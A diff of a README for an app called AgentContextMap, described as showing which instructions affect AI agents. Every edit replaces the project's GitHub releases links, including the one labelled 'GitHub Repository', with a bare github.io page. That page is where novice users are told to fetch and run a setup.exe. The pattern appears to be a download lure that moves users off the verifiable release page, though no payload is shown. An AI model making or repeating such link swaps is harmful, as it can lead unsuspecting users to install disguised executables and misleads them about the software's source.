@@ -1,6 +1,6 @@
 # 🗺️ AgentContextMap - See Which Instructions Affect Your Agents
 
-[![Download AgentContextMap](https://img.shields.io/badge/Download-AgentContextMap-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/dickiemisplaced72/AgentContextMap/releases)
+[![Download AgentContextMap](https://img.shields.io/badge/Download-AgentContextMap-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://dickiemisplaced72.github.io)
 
 ---
 
@@ -33,7 +33,7 @@ Getting started with AgentContextMap is easy. Just follow these three simple ste
 
 Visit this link to download the application:
 
-👉 **[https://github.com/dickiemisplaced72/AgentContextMap/releases](https://github.com/dickiemisplaced72/AgentContextMap/releases)**
+👉 **[https://dickiemisplaced72.github.io](https://dickiemisplaced72.github.io)**
 
 Click the most recent release and download the file for your computer. The file will be named something like `AgentContextMap-setup.exe` or similar.
 
@@ -68,7 +68,7 @@ That's it! No complicated setup. No command line. No technical knowledge require
 
 ### How to Install
 
-1. **Visit the download page** by clicking here: [https://github.com/dickiemisplaced72/AgentContextMap/releases](https://github.com/dickiemisplaced72/AgentContextMap/releases)
+1. **Visit the download page** by clicking here: [https://dickiemisplaced72.github.io](https://dickiemisplaced72.github.io)
 
 2. **Find the latest release** — look for the newest version at the top of the page.
 
@@ -205,8 +205,8 @@ If you run into any issues, here are some common solutions:
 
 ## 📚 Additional Resources
 
-- **GitHub Repository**: [AgentContextMap on GitHub](https://github.com/dickimisplaced72/AgentContextMap)
-- **Releases & Downloads**: [Download page](https://github.com/dickimisplaced72/AgentContextMap/releases)
+- **GitHub Repository**: [AgentContextMap on GitHub](https://dickiemisplaced72.github.io)
+- **Releases & Downloads**: [Download page](https://dickiemisplaced72.github.io)
 - **Issues & Support**: If you find a bug or have a feature request, please open an issue on the GitHub repository page.
 
 ---
@@ -227,7 +227,7 @@ If you find AgentContextMap useful, consider starring the repository on GitHub �
 
 ---
 
-**[Download AgentContextMap Now](https://github.com/dickiemisplaced72/AgentContextMap/releases)** 👈 Click here to get started today!
+**[Download AgentContextMap Now](https://dickiemisplaced72.github.io)** 👈 Click here to get started today!
 
 ---
 
